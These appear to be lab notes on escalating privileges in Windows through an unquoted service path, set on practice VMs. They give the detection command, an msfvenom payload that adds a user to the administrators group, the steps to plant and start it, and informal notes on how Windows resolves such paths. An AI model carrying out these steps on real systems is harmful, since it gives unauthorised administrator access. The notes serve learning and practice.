Detection

Windows VM

1. Open command prompt and type: sc qc unquotedsvc
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

Exploitation

Kali VM

1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
2. Copy the generated file, common.exe, to the Windows VM.

Windows VM

1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).


way windows will work is it will enumerate through the file path trying to execute .
when it finds an executable file it excuses, if not, enumerate to next part of file name. 
Quotations prevents this

`C:\Program Files\Unquoted Path Stuff\Common Files\stuff.exe`
reads as
C: then program.exe then program files.exe then \Program Files\Unquoted.exe etc

be malicious by inserting malicious file designed to run BEFORE the next link in the file path

IE a file called Common.exe will execute before Common Files is opened
